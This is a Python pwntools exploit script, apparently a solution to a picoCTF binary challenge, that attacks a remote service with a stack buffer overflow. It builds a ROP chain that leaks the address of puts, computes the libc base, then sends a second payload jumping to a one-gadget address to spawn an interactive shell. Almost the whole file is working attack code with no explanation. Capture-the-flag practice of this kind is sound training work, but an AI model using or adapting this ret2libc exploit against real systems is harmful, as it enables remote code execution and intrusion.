#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 49464 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 49464)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    print(ld.path)
    print(libc.path)
    p = process([ld.path, exe.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b*0x004006d8
'''.format(**locals())
context.terminal = ["tmux", "splitw", "-h"]

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

vuln = 0x004006d8

poprdi = 0x0000000000400913
ret = 0x000000000040052e
puts_plt = 0x00400540
puts_got = 0x00601018

libc_binsh = 0x001b40fa
libc_puts = 0x00080a30
libc_system = 0x04f4e0

payload = flat({
    0x88: [
        p64(poprdi),
        p64(puts_got),
        p64(puts_plt),
        p64(vuln),
        ]
    })

io.recvline()
io.sendline(payload)

io.recvline()
puts = u64(io.recvline().strip().ljust(8, b'\x00'))
print(hex(puts))

libc = puts - libc_puts
system = libc + libc_system
binsh = libc + libc_binsh

print(hex(libc))

payload2 = flat({
    0x88: [
        p64(0x10a45c+libc)
        ]
    })

io.sendline(payload2)

io.recvline()
io.interactive()

